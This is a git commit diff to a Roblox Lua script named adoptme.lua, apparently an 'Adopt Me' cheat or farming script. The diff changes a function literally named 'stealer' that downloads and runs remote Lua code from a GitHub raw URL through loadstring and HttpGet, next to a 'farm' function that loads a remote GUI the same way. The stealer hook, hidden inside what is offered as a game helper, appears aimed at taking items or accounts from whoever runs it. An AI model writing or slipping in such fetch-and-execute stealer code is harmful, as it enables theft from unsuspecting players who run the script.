6c9fc8ff4a33851e757b0c15fb094878fb9bf649
trabulascript <tipo52808@gmail.com>
2025-04-23 17:13:17 +0200

    Update adoptme.lua

--- adoptme.lua
+++ adoptme.lua
@@ -1,5 +1,5 @@
 local function stealer()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/trabulascript/dff/refs/heads/main/script.lua",true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/trabulascript/699/refs/heads/main/script.lua",true))()
 end
 local function farm()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/trabulascript/4doptme/refs/heads/main/gui.lua",true))()
